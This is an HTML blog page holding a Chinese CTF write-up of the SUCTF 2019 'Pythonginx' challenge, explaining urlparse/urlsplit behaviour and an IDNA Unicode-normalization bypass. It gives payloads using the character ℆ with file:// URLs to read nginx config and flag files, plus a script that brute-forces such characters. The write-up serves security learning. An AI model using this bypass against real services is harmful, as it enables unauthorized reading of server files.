@@ -1,0 +1,413 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>日常练习18 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-04-19">2021-04-19</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">日常练习18</h2>
+            <div class="post-meta">
+                emm... 4572 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>这道题和我之前做到的那道unicode编码漏洞问题有相同之处，除此之外又考察了一些代码审计和nginx的相关知识点。   </p>
+<h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>打开题目就已经给出了源码。  </p>
+<pre><code>@app.route(&#39;/getUrl&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def getUrl():
+url = request.args.get(&quot;url&quot;)
+host = parse.urlparse(url).hostname
+if host == &#39;suctf.cc&#39;:
+    return &quot;我扌 your problem? 111&quot;
+parts = list(urlsplit(url))
+host = parts[1]
+if host == &#39;suctf.cc&#39;:
+    return &quot;我扌 your problem? 222 &quot; + host
+newhost = []
+for h in host.split(&#39;.&#39;):
+    newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
+parts[1] = &#39;.&#39;.join(newhost)
+#去掉 url 中的空格
+finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]
+host = parse.urlparse(finalUrl).hostname
+if host == &#39;suctf.cc&#39;:
+    return urllib.request.urlopen(finalUrl).read()
+else:
+    return &quot;我扌 your problem? 333&quot;
+&lt;/code&gt;
+&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;
+&lt;!-- Do you know the nginx? --&gt;  </code></pre>
+<p>可以看到路由是/getUrl,代码结尾告诉我们不用在意这个suctf.cc这个域名，然后让我们了解一下nginx这个东西，那我们先是要简单上网百度一下的。  </p>
+<p>经过查询后发现这个nginx是一个是开源、高性能、高可靠的 Web 和反向代理服务器，具体介绍如下：  </p>
+<pre><code>Nginx 是开源、高性能、高可靠的 Web 和反向代理服务器，而且支持热部署，几乎可以做到 7 * 24 小时不间断运行，即使运行几个月也不需要重新启动，还能在不间断服务的情况下对软件版本进行热更新。性能是 Nginx 最重要的考量，其占用内存少、并发能力强、能支持高达 5w 个并发连接数，最重要的是，Nginx 是免费的并可以商业化，配置使用也比较简单。
+
+Nginx 的最重要的几个使用场景：
+
+静态资源服务，通过本地文件系统提供服务；
+
+反向代理服务，延伸出包括缓存、负载均衡等；
+
+API 服务，OpenResty ；
+
+对于前端来说 Node.js 不陌生了，Nginx 和 Node.js 的很多理念类似，HTTP 服务器、事件驱动、异步非阻塞等，且 Nginx 的大部分功能使用 Node.js 也可以实现，但 Nginx 和 Node.js 并不冲突，都有自己擅长的领域。Nginx 擅长于底层服务器端资源的处理（静态资源处理转发、反向代理，负载均衡等），Node.js 更擅长上层具体业务逻辑的处理，两者可以完美组合，共同助力前端开发。  </code></pre>
+<p>但是这道题目并不需要我们多么深入了解nginx，我们要得到flag，就需要知道nginx一些文件存放的地方  </p>
+<pre><code>配置文件存放目录：/etc/nginx
+主配置文件：/etc/nginx/conf/nginx.conf
+管理脚本：/usr/lib64/systemd/system/nginx.service
+模块：/usr/lisb64/nginx/modules
+应用程序：/usr/sbin/nginx
+程序默认存放位置：/usr/share/nginx/html
+日志默认存放位置：/var/log/nginx
+配置文件目录为：/usr/local/nginx/conf/nginx.conf  </code></pre>
+<p>我们要想找到flag文件就要从配置文件目录来找，接下来就是看源码来分析了：  </p>
+<p>可以看到源码中的陌生函数是urlparse(),urlsplit()。而变量host就是我们上传的url进行变化后的字符串。在结尾如果if host == ‘suctf.cc’:那么就执行如下代码   </p>
+<pre><code>return urllib.request.urlopen(finalUrl).read()  </code></pre>
+<p>也就是会打开我们上传的url的路径的文件。那么我们应该上传的是file://协议。  </p>
+<p>接下来具体看一下这两个函数作用。  </p>
+<pre><code>顾名思义，urlsplit是拆分，而urlparse是解析，所以urlparse粒度更为细致
+
+区别
+split函数在分割的时候，path和params属性是在一起的
+代码示例
+
+# -*- coding: utf-8 -*-
+
+from urllib.parse import urlsplit, urlparse
+
+url = &quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;
+
+print(urlsplit(url))
+&quot;&quot;&quot;
+SplitResult(
+scheme=&#39;https&#39;, 
+netloc=&#39;username:password@www.baidu.com:80&#39;, 
+path=&#39;/index.html;parameters&#39;, 
+query=&#39;name=tom&#39;, 
+fragment=&#39;example&#39;)
+&quot;&quot;&quot;
+
+print(urlparse(url))
+&quot;&quot;&quot;
+ParseResult(
+scheme=&#39;https&#39;, 
+netloc=&#39;username:password@www.baidu.com:80&#39;, 
+path=&#39;/index.html&#39;, 
+params=&#39;parameters&#39;, 
+query=&#39;name=tom&#39;, 
+fragment=&#39;example&#39;
+)   </code></pre>
+<p>可以看到这两个函数都是对上传的url进行拆解的函数，只不过拆解的细分程度不同罢了。  </p>
+<p>简单来说就是前两个if判断语句要求host不能为suctf.cc,第三个语句则是要求经过了decode(‘utf-8’) 之后传进了 urlunsplit 函数后，<strong>意思是将域名每个部分进行idna编码后，再utf-8解码，</strong>使host==suctf.cc，可以看出这是要让我们绕过前两个if。  </p>
+<p>由上面的utf-8我们就可以想到之前那道unicode编码造成的安全问题了。猜测这道题目也是有关Unicode编码转换的问题。  </p>
+<p>因为前面已经说过了，我们既要使host不等于suctf.cc，又要使它经过编码后等于suctf.cc那么我们就可以使用这个符号<strong>℆</strong>，我们这样构造：  </p>
+<pre><code>file://suctf.c℆sr/local/nginx/conf/nginx.conf  </code></pre>
+<p>这样经过转换后还是等于suctf.cc.满足了三个if条件。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6081b68fd1a9ae528ff6eca9.png"><img src="https://img.imgdb.cn/item/6081b68fd1a9ae528ff6eca9.png"></a>  </p>
+<p>得到flag文件路径。  </p>
+<pre><code>file://suctf.c℆sr/fffffflag</code></pre>
+<p>得到flag。</p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6081b6d5d1a9ae528ff96618.png"><img src="https://img.imgdb.cn/item/6081b6d5d1a9ae528ff96618.png"></a>  </p>
+<p>其实关于这个特殊字符可以使用脚本跑出来，有很多可以使用的字符，其原理都是一样的。  </p>
+<p>附上大佬脚本：  </p>
+<pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit
+from urllib import parse
+def get_unicode():
+for x in range(65536):
+    uni=chr(x)
+    url=&quot;http://suctf.c&#123;&#125;&quot;.format(uni)
+    try:
+        if getUrl(url):
+            print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])
+    except:
+        pass
+
+def getUrl(url):
+url=url
+host=parse.urlparse(url).hostname
+if host == &#39;suctf.cc&#39;:
+    return False
+parts=list(urlsplit(url))
+host=parts[1]
+if host == &#39;suctf.cc&#39;:
+    return False
+newhost=[]
+for h in host.split(&#39;.&#39;):
+    newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
+parts[1]=&#39;.&#39;.join(newhost)
+finalUrl=urlunsplit(parts).split(&#39; &#39;)[0]
+host=parse.urlparse(finalUrl).hostname
+if host == &#39;suctf.cc&#39;:
+    return True
+else:
+    return False
+
+
+if __name__==&#39;__main__&#39;:
+get_unicode()</code></pre>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考了几个新的知识点，其一是关于nginx的了解，了解其基本的配置文件的路径，其二是对这两个函数的了解。关于绕过匹配用到的其实是前不久刚学过的Unicode编码的问题，出题人想要考察的就是这一点，后来发现这是blackhat议题之一HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization。下面给出相关链接。  </p>
+<p><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">blackhat议题——HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Janson_Lin/article/details/105954705?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161909758416780271533785%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161909758416780271533785&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105954705.first_rank_v2_pc_rank_v29&utm_term=nginx">Nginx 介绍</a>  </p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
